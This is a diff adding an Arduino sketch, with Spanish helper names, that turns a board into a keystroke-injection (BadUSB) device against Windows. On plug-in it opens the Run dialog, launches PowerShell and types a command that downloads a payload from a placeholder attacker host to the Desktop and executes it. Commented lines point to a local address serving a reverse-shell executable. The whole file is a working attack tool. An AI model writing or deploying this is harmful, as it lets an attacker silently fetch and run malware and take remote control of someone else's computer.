@@ -1,0 +1,65 @@
+#include <Keyboard.h>
+#include <KeyboardLayout.h>
+#include <Keyboard_da_DK.h>
+#include <Keyboard_de_DE.h>
+#include <Keyboard_es_ES.h>
+#include <Keyboard_fr_FR.h>
+#include <Keyboard_hu_HU.h>
+#include <Keyboard_it_IT.h>
+#include <Keyboard_pt_PT.h>
+#include <Keyboard_sv_SE.h>
+void setup(){
+  pinMode(LED_BUILTIN, OUTPUT);
+  digitalWrite(LED_BUILTIN, HIGH);
+  Keyboard.begin();
+
+  delay(500);
+  // Keyboard.press(KEY_LEFT_GUI);
+  // Keyboard.press('d');
+  Keyboard.press(KEY_LEFT_GUI); 
+  Keyboard.press('d');
+  
+  // delay(500);
+  // Keyboard.releaseAll();
+  // delay(500);
+  
+  Ejecutar();
+  Tipear("PowerShell"); 
+  Enter();
+  delay(2000);
+  Tipear("(New-Object System.Net.WebClient).DownloadFile(\"http://{DIRECCION IP}/{NOMBRE DEL PAYLOAD}\", \"$($Env:userprofile)/Desktop/{NOMBRE DEL PAYLOAD}\")");
+  Enter();
+  delay(2000);
+  Tipear("Invoke-item $Env:userprofile/Desktop/{NOMBRE DEL PAYLOAD}");
+  Enter();
+  delay(1000);
+// (New-Object Net.WebClient).DownloadFile('http://http://192.168.1.235/reverse.exe/reverse_shell.exe','reverse_shell.exe')
+//$webclient.DownloadFile("http://192.168.1.235/reverse.exe", "$($Env:userprofile)/reverse.exe")
+  delay(500);
+  Keyboard.end();
+  digitalWrite(LED_BUILTIN, LOW);
+
+}
+
+void loop() {
+
+}
+void Tipear(char txt[]){
+  delay(200);
+  Keyboard.print(txt);
+  delay(200);
+}
+void Enter(){
+  delay(200);
+  Keyboard.press(KEY_RETURN);
+  delay(200);
+  Keyboard.release(KEY_RETURN);
+}
+
+void Ejecutar(){
+  delay(200);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(200);
+  Keyboard.releaseAll();
+}
